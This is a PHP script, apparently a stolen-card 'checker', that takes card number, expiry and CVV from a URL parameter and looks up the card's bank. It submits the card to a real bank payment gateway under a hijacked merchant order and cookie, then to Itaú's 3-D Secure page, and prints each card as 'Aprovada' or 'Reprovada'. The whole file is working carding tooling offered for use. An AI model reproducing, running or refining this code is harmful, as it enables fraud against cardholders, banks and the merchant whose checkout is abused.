<?php
session_start();
error_reporting(0);

if (file_exists("cookie.txt")) {
unlink("cookie.txt");}

$time = time();

function multiexplode($delimiters, $string) {
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}

///Divisorias
$lista = $_GET['lista'];
$cc = multiexplode(array("|", " "), $lista)[0];
$mes = multiexplode(array("|", " "), $lista)[1];
$ano = multiexplode(array("|", " "), $lista)[2];
$cvv = multiexplode(array("|", " "), $lista)[3];




///BIN BUSCA
$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";
$bin=substr($cc,0,6);

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$card=explode("|",$_GET['lista']);
$cc=$card[0];
$time = time();
$bin = substr($cc, 0, 2);
$mes=$card[1];
$ano=$card[2];
$cvv=$card[3];

switch ($ano) { 
         case '2018':$mes = '18';break; 
         case '2019':$ano = '19';break; 
         case '2020':$ano = '20';break; 
         case '2021':$ano = '21';break; 
         case '2022':$ano = '22';break; 
         case '2023':$ano = '23';break; 
         case '2024':$ano = '24';break; 
         case '2025':$ano = '25';break; 
         case '2026':$ano = '26';break; 
         case '2027':$ano = '27';break; 
         case '2028':$ano = '28';break; 
}

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

function ano12() {
	switch ($ano) {
		case '20': $ano = '2020'; break;
		case '21': $ano = '2021'; break;
		case '22': $ano = '2022'; break;
		case '23': $ano = '2023'; break;
		case '24': $ano = '2024'; break;
		case '25': $ano = '2025'; break;
		case '26': $ano = '2026'; break;
		case '27': $ano = '2027'; break;
		case '28': $ano = '2028'; break;
		case '29': $ano = '2029'; break;
	}}
function mes12() {
	switch ($mes) {
		case '1': $mes = '01'; break;
		case '2': $mes = '02'; break;
		case '3': $mes = '03'; break;
		case '4': $mes = '04'; break;
		case '5': $mes = '05'; break;
		case '6': $mes = '06'; break;
		case '7': $mes = '07'; break;
		case '8': $mes = '08'; break;
		case '9': $mes = '09'; break;
		case '10': $mes = '10'; break;
		case '11': $mes = '11'; break;
		case '12': $mes = '12'; break;
}}



if($bin[0] == 4){ //visa
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';    
}else{ //master
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';    
}

///CURL PAGAMETO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://spos.denizbank.com/mpi/Default.aspx");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

 'Host: spos.denizbank.com',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://spos.denizbank.com/mpi/Default.aspx',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; SM-J105H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: TS011b75d3=01eb26faee1b35747804d9f012ad6d1c690adf082897d38a2c449b98e2e5c10cb879f3cde9f0839f86c4710ac6b3169ce10df3ecd66d6d3aaa06fe093c18d64f023b07aa30',
)); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Pan='.$cc.'&Cvv2='.$cvv.'&Expiry=0528&ShopCode=6535&PurchAmount=200.00&Currency=949&OrderId=FZBA164417739427096&OkUrl=https%3A%2F%2Ffonzip.com%2Ffz-pg%2Ffzvsc%2F13%2F8861246%2F5d53da2f1dfe4e978ae6a7cabb7a0f23&FailUrl=https%3A%2F%2Ffonzip.com%2Ffz-pg%2Ffzvfc%2F13%2F8861246%2F5d53da2f1dfe4e978ae6a7cabb7a0f23&Rnd=164417739427096&Hash=aEkhluL2SKhJjvX5HWl8Wxym9Uk%3D&TxnType=Auth&InstallmentCount=&SecureType=3DModel&CardType=0&Lang=tr');
echo $result = curl_exec($ch);

#Fim
$pareq=urlencode(getstr($result,'"PaReq" value="','"'));
$term=urlencode(getstr($result,'"TermUrl" value="','"'));
$md=urlencode(getstr($result,'"MD" value="','"'));



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://authenticationweb.cartoes-itau.com.br/AuthenticationWEB/in.jsp');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,__DIR__.'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "TermUrl=$term&PaReq=$pareq&MD=$md");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: authenticationweb.cartoes-itau.com.br';
$headers[] = 'Origin: https://ridader.org.tr';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://ridader.org.tr/';
$headers[] = 'Accept-Language: pt-BR;q=0.8';
$headers[] = 'application/x-www-form-urlencoded';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);


if (strpos($result, 'Verifique se o n&#250;mero do seu Cart&#227;o de Cr&#233;dito foi digitado corretamente')) {
exit('<b><span class="badge badge-danger badge-glow"> Reprovada </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span>  <span class="badge badge-info"> Retorno:</span> Numero do Cartao Invalido </span><br>');}

elseif (strpos($result, 'Entre em contato com a Administradora do seu Cart&#227;o de Cr&#233;dito, pois seu Cart&#227;o est&#225; bloqueado.')) {
exit('<b><span class="badge badge-danger  badge-glow"> Reprovada </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> <span class="badge badge-info"> Retorno:</span> Cartao bloqueado</span><br>');}

elseif (strpos($result, 'https&#x3a;&#x2f;&#x2f;ww83&#x2e;itau&#x2e;com&#x2e;br&#x2f;GRIPNET&#x2f;bklcom&#x2e;dll')) {
exit('<b><span class="badge badge-success badge-glow"> Aprovada </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> '.$bandeira.' '.$banco.' '.$level.' '.$pais.' <span class="badge badge-info"> Retorno:</span> Aprovada </span><br>');}


else{
exit('<b><span class="badge badge-danger  badge-glow"> Reprovada </span> → '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'  </span> <span class="badge badge-info"> Retorno:</span> contate o criador @JV086 </span><br>');}
?>
